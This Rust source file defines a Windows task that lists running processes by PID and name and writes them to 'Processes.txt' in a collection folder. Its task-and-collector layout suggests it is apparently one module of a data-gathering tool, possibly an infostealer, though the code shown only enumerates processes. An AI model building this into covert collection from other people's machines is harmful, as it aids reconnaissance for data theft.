use crate::alloc::borrow::ToOwned;
use alloc::string::{String, ToString};
use alloc::vec::Vec;
use collector::atomic::AtomicCollector;
use core::ffi::CStr;
use core::fmt::Write;
use core::ptr::null_mut;
use tasks::{parent_name, Task};
use utils::path::{Path, WriteToFile};
use windows_sys::Win32::Foundation::{CloseHandle, MAX_PATH};
use windows_sys::Win32::System::ProcessStatus::{K32EnumProcesses, K32GetModuleBaseNameA};
use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};

pub(super) struct ProcessesTask;

impl Task for ProcessesTask {
    parent_name!("Processes.txt");
    
    unsafe fn run(&self, parent: &Path, _: &AtomicCollector) {
        let processes = get_process_list();

        let max_pid_width = processes
            .iter()
            .map(|p| p.pid.to_string().len())
            .max()
            .unwrap_or(3);

        let pid_col_width = max_pid_width + 2;

        let mut output = String::new();
        let _ = writeln!(&mut output, "{:<width$}{}", "PID", "NAME", width = pid_col_width);

        for process in processes {
            let _ = writeln!(
                &mut output,
                "{:<width$}{}",
                process.pid,
                process.name,
                width = pid_col_width
            );
        }

        let _ = output.write_to(parent);
    }
}

struct ProcessInfo {
    pid: u32,
    name: String
}

unsafe fn get_process_list() -> Vec<ProcessInfo> {
    let mut pids = [0u32; 1024];
    let mut bytes_returned = 0u32;
    let mut result = Vec::new();

    let success = unsafe {
        K32EnumProcesses(
            pids.as_mut_ptr(),
            size_of_val(&pids) as u32,
            &mut bytes_returned,
        )
    };

    if success == 0 {
        return result;
    }

    let count = (bytes_returned as usize) / core::mem::size_of::<u32>();

    for &pid in &pids[..count] {
        if pid == 0 {
            continue;
        }

        let handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, pid);

        if handle == null_mut() {
            continue;
        }

        let mut name_buf = [0u8; MAX_PATH as usize];

        let len = K32GetModuleBaseNameA(handle, null_mut(), name_buf.as_mut_ptr(), name_buf.len() as u32);

        if len > 0 {
            let name = CStr::from_ptr(name_buf.as_ptr() as *const i8);
            
            if let Ok(name_str) = name.to_str() {
                result.push(ProcessInfo {
                    pid,
                    name: String::from(name_str),
                });
            }
        }

        CloseHandle(handle);
    }

    result
}